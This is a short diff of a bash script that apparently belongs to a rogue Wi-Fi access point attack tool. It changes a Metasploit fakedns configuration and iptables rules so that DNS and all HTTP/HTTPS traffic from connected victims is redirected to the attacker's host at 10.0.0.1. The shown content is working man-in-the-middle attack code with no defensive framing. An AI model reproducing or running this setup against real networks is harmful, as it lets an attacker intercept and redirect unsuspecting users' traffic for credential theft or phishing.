@@ -708,7 +708,7 @@ if [ "$debug" == "true" ]; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 if [ "$apMode" == "non" ]; then
 echo "use auxiliary/server/fakedns
 set INTERFACE $whichinterface
-set DOMAINBYPASS www.google.com
+set DOMAINBYPASS *
 set SRVHOST 0.0.0.0
 set SRVPORT 53
 set TARGETHOST 10.0.0.1
@@ -878,11 +878,11 @@ echo -e "\e[01;32m[>]\e[00m Forcing target to vist our site..."
 # Could of done this at the start, but we were not ready for them then! JUST PORT 80,443 MIND YOU! (All other traffic (e.g. NON HTTP) might have internet access)
 if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1"; fi
 if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1"; fi
-iptables -A INPUT -p udp -i $whichinterface --sport 53 --dport 1024:65535 -j ACCEPT
-iptables -A INPUT -p tcp -i $whichinterface --dport 80 --sport 1024:65535 -j ACCEPT
-iptables -A INPUT -p tcp -i $whichinterface --dport 443 --sport 1024:65535 -j ACCEPT
-iptables -A INPUT -p tcp -i $whichinterface --dport $port --sport 1024:65535 -j ACCEPT
-iptables -A INPUT -p udp -i $whichinterface --dport $port --sport 1024:65535 -j ACCEPT
+iptables -A INPUT -p udp -i $whichinterface --dport 53 -j ACCEPT
+iptables -A INPUT -p tcp -i $whichinterface --dport 80  -j ACCEPT
+iptables -A INPUT -p tcp -i $whichinterface --dport 443 -j ACCEPT
+iptables -A INPUT -p tcp -i $whichinterface --dport $port -j ACCEPT
+iptables -A INPUT -p udp -i $whichinterface --dport $port -j ACCEPT
 iptables -A INPUT -i $whichinterface -j DROP # drop all other traffic
 iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
 iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
